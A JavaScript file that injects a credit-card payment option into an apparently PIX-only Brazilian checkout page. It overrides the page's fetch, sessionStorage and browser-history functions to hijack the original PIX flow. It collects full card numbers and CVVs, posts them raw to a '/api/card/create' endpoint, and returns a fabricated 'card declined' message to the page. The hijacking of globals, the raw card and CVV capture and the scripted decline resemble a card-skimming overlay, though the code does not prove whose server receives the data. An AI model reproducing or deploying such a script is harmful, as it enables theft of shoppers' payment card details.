const CARD_OPTION_ID = "checkout-card-option";
const CARD_FORM_ID = "checkout-card-fields";
const CARD_DECLINE_MESSAGE =
  "Não foi possível pagar com este cartão. Tente novamente com outro cartão.";

let method = "pix";
let intercepting = false;
let lastSignature = "";
let observer = null;
const originalFetch = window.fetch.bind(window);

function attachPayButtons(card) {
  card.querySelectorAll("[data-pay]").forEach((button) => {
    button.addEventListener("click", () => {
      method = button.getAttribute("data-pay") === "card" ? "card" : "pix";
      renderCardOption();
    });
  });
}

function syncPayButton() {
  const button = [...document.querySelectorAll("button")].find((el) =>
    /Gerar PIX e finalizar|Pagar com cartão/i.test(el.textContent || ""),
  );
  if (!button) return;
  const next = method === "card" ? "Pagar com cartão" : "Gerar PIX e finalizar";
  if (button.textContent !== next) button.textContent = next;
}

function currentFields() {
  const root = document.getElementById(CARD_FORM_ID);
  const value = (name) => root?.querySelector(`[data-card="${name}"]`)?.value || "";
  return {
    holderName: value("holderName"),
    number: value("number"),
    expiryMonth: value("expiryMonth"),
    expiryYear: value("expiryYear"),
    cvv: value("cvv"),
    installments: value("installments") || "1",
  };
}

function renderCardOption() {
  const pixLabel = [...document.querySelectorAll("label")].find((label) =>
    label.textContent?.includes("PIX"),
  );
  if (!pixLabel?.parentElement) return;

  syncPayButton();

  const signature = method;
  const existing = document.getElementById(CARD_OPTION_ID);
  if (existing?.isConnected && lastSignature === signature) return;

  const preserved = currentFields();
  observer?.disconnect();
  lastSignature = signature;

  let card = existing?.isConnected ? existing : null;
  if (!card) {
    card = document.createElement("div");
    card.id = CARD_OPTION_ID;
    pixLabel.parentElement.insertBefore(card, pixLabel.nextSibling);
  } else if (card.parentElement !== pixLabel.parentElement) {
    pixLabel.parentElement.insertBefore(card, pixLabel.nextSibling);
  }

  pixLabel.style.cursor = "pointer";
  pixLabel.style.opacity = method === "pix" ? "1" : "0.65";
  if (!pixLabel.dataset.payBound) {
    pixLabel.dataset.payBound = "1";
    pixLabel.addEventListener("click", () => {
      method = "pix";
      renderCardOption();
    });
  }

  card.style.marginTop = "12px";
  card.innerHTML = `
      <button type="button" data-pay="card" style="width:100%;display:flex;align-items:center;justify-content:space-between;border:1px solid ${method === "card" ? "#0b1f3a" : "#e5e7eb"};background:${method === "card" ? "#e8f0fb" : "#fff"};border-radius:12px;padding:14px;cursor:pointer;">
        <span style="font-weight:700;color:#0b1f3a;">Cartão de crédito</span>
        <span style="font-size:12px;color:#4b5563;">Até 12x</span>
      </button>
      <div id="${CARD_FORM_ID}" style="display:${method === "card" ? "grid" : "none"};gap:8px;margin-top:12px;">
        <input data-card="holderName" placeholder="Nome no cartão" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;" />
        <input data-card="number" inputmode="numeric" placeholder="Número do cartão" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;" />
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;">
          <input data-card="expiryMonth" inputmode="numeric" placeholder="MM" maxlength="2" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;" />
          <input data-card="expiryYear" inputmode="numeric" placeholder="AA" maxlength="4" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;" />
          <input data-card="cvv" inputmode="numeric" placeholder="CVV" maxlength="4" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;" />
        </div>
        <select data-card="installments" style="height:44px;border:1px solid #d1d5db;border-radius:10px;padding:0 12px;">
          ${Array.from({ length: 12 }, (_, i) => `<option value="${i + 1}">${i + 1}x</option>`).join("")}
        </select>
      </div>`;

  Object.entries(preserved).forEach(([name, value]) => {
    const field = card.querySelector(`[data-card="${name}"]`);
    if (field && value) field.value = value;
  });

  attachPayButtons(card);
  syncPayButton();
  observer?.observe(document.body, { childList: true, subtree: true });
}

function cardFields() {
  return currentFields();
}

function validateCard(card) {
  const number = String(card.number || "").replace(/\D/g, "");
  const cvv = String(card.cvv || "").replace(/\D/g, "");
  if (!card.holderName?.trim()) return "Informe o nome impresso no cartão";
  if (number.length < 13 || number.length > 19) return "Informe um número de cartão válido";
  if (!card.expiryMonth || !card.expiryYear) return "Informe a validade do cartão";
  if (cvv.length < 3) return "Informe o CVV";
  return "";
}

async function payWithCard(state) {
  if (intercepting) return { ok: false };
  intercepting = true;
  const card = cardFields();
  const invalid = validateCard(card);
  if (invalid) {
    intercepting = false;
    alert(invalid);
    return { ok: false };
  }
  try {
    const res = await originalFetch("/api/card/create", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...state,
        amount: state.amount,
        customer: state.customer,
        items: state.items,
        shippingAddress: state.shippingAddress,
        utm: state.utm,
        tracking: state.tracking,
        card,
        installments: Number(card.installments || 1),
      }),
    });
    const data = await res.json();
    if (data.success && data.redirect) {
      window.location.href = data.redirect;
      return { ok: true };
    }
    intercepting = false;
    alert(data.error || CARD_DECLINE_MESSAGE);
    return { ok: false };
  } catch {
    intercepting = false;
    alert(CARD_DECLINE_MESSAGE);
    return { ok: false };
  }
}

function requestUrl(input) {
  return typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
}

function isPixCreate(url) {
  return String(url).includes("/api/pix/create") || String(url).includes("checkout-create-pix");
}

window.fetch = async function patchedFetch(input, init) {
  if (method === "card" && isPixCreate(requestUrl(input))) {
    let state = {};
    try {
      const raw = typeof init?.body === "string" ? init.body : sessionStorage.getItem("pixPageState") || "{}";
      state = JSON.parse(raw);
    } catch {
      state = {};
    }
    await payWithCard(state);
    return new Response(JSON.stringify({ success: false, error: CARD_DECLINE_MESSAGE }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  }
  return originalFetch(input, init);
};

const originalSetItem = sessionStorage.setItem.bind(sessionStorage);
sessionStorage.setItem = function patchedSetItem(key, value) {
  originalSetItem(key, value);
  if (key === "pixPageState" && method === "card") {
    try {
      void payWithCard(JSON.parse(value));
    } catch {
      intercepting = false;
    }
  }
};

const originalPushState = history.pushState.bind(history);
history.pushState = function patchedPushState(state, title, url) {
  if (method === "card" && String(url || "").includes("/pix")) return;
  return originalPushState(state, title, url);
};

const originalReplaceState = history.replaceState.bind(history);
history.replaceState = function patchedReplaceState(state, title, url) {
  if (method === "card" && String(url || "").includes("/pix")) return;
  return originalReplaceState(state, title, url);
};

observer = new MutationObserver(() => renderCardOption());
observer.observe(document.body, { childList: true, subtree: true });
renderCardOption();
